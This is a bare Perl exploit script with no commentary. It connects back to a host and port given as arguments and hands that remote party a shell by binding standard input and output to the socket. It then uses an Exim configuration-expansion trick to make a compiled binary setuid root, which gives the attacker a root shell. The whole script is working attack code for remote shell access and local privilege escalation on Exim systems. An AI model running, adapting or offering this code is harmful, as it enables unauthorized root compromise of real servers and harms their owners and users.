$system = '/bin/sh';
$ARGC=@ARGV;
if ($ARGC!=2) {
   print "Usage: $0 [Host] [Port] \n\n";
   die "Ex: $0 127.0.0.1 2121 \n";
}
use Socket;
use FileHandle;
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n";
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";
SOCKET->autoflush();
open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");
 
open FILE, ">/var/spool/exim4/s.c";
print FILE qq{
#include <stdio.h>
#include <unistd.h>
int main(int argc, char *argv[])
{
setuid(0);
setgid(0);
setgroups(0, NULL);
execl("/bin/sh", "sh", NULL);
}
};
close FILE;
 
system("gcc /var/spool/exim4/s.c -o /var/spool/exim4/s; rm /var/spool/exim4/s.c");
open FILE, ">/tmp/e.conf";
print FILE "spool_directory = \${run{/bin/chown root:root /var/spool/exim4/s}}\${run{/bin/chmod 4755 /var/spool/exim4/s}}";
close FILE;
 
system("exim -C/tmp/e.conf -q; rm /tmp/e.conf");
system("uname -a;");
system("/var/spool/exim4/s");
system($system);
